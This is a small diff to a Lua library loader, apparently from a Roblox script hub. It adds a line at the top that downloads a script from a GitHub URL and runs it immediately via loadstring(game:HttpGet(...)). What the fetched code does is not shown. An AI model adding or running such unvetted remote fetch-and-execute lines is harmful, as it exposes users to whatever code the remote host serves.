@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hookmetamethod-hook/Future-Hub/refs/heads/main/core/protectui.lua"))()
+
 if not _G.Library then
     _G.Library = {}
     _G.Library.Main = loadstring(game:HttpGet("wip"))()
